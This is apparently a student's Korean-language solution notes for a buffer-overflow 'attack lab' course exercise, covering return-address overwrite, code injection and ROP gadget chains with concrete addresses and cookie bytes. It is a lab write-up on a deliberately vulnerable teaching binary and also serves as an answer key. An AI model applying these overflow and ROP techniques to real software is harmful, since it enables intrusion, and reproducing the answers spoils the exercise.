@@ -1,0 +1,50 @@
+https://blog.adelie.cc/164
+<getbuf>
+buffer의 크기 0x18
+<phase1> <touch1>
+touch1이 시작하는 곳은 0x401926
+즉, 입력으로 0x18 바이트만큼의 아무값 + 0x401926을 주면 getbuf 함수가 끝나고 return 할 때 0x401926으로 jump하고 touch1이 실행된다.
+<phase2> <touch2>
+인자로 받은 값을 자신이 갖고 있는 cookie.txt에 있는 값과 같은지 비교해서 같은 경우 통과
+edi에 쿠키값 넣어줘야 한다. -> 기계어 코드를 버퍼에 삽입해야 한다.
+따라서 ans2.txt 넣기 전에 어셈블리 코드를 한 번 실행하고 리턴해야 함.
+- edi에 쿠키를 넣어주고 리턴하는 코드
+- 버퍼 크기만큼의 패딩
+- 버퍼의 코드 주소(첫 리턴 어드레스)
+- touch2의 주소(두 번째 리턴 어드레스)
+gdb로 getbuf에 breakpoint 설정하고 run한 담에 info reg $rsp값 확인
+-> 0x55624930
+여기에서 버퍼 크기 0x18뺀 값 -> 0x55624918
+<phase3> <touch3>
+문자열을 입력받고 hexmatch 함수로 쿠키와 같은지 비교하기
+내 쿠키 = 0x1b93747c -> 31 62 39 33 37 34 37 63
+아스키 코드를 이용해서 바꾸기
+0x55624930 에 첫번째 리턴 어드레스
++0x8에 edi 넣어준다
+<phase4>
+rtarget을 이용하여 ROP 기법 이용
+버퍼에 삽입한 코드는 실행이 불가하게 막아두어서 코드 삽입은 불가
+ROP는 이미 존재하는 코드 내에서 필요한 코드를 짜집기하는 방식
+phase2를 똑같이 하되 코드 인젝션 대신 ROP로 하면 됨.
+rtarget의 start_farm함수와 end_farm 함수 사이에서 필요한 명령어를 찾아다 쓰면 됨.
+-버퍼 크기 만큼의 패딩
+popq %rax, ret이 있는 주소 - 0x401b03
+쿠키 값 (그래야 popq 수행시 이 값이 rax로 들어감) - 0x1b93747c
+movq %rax, %rdi가 있는 주소 - 0x401b08
+touch2 함수의 주소 - 0x401952
+<phase5>
+rop로 마찬가지로 phase3 해결
+farm에서 쓸 수 있는 가젯 찾기. 가젯은 원하는 명령어+c3로 끝나면 가젯.
+90은 no operation으로 아무것도 하지 않음
+
+movq %rsp, %rax - 0x401b49
+movq %rax, %rdi - 0x401b08
+popq %rax, ret - 0x401b03
+offset (rsp를 rax로 옮기는 시점에서 cookie와의 거리) - 0x48
+movl %eax, %edx - 0x401bf1
+movl %edx, %ecx - 0x401c0b
+movl %ecx, %esi - 0x401bbb
+add__xy - 0x401b3b
+movq %rax, %rdi - 0x401b08
+touch3 주소 - 0x401a63
+cookie string - 31 62 39 33 37 34 37 63
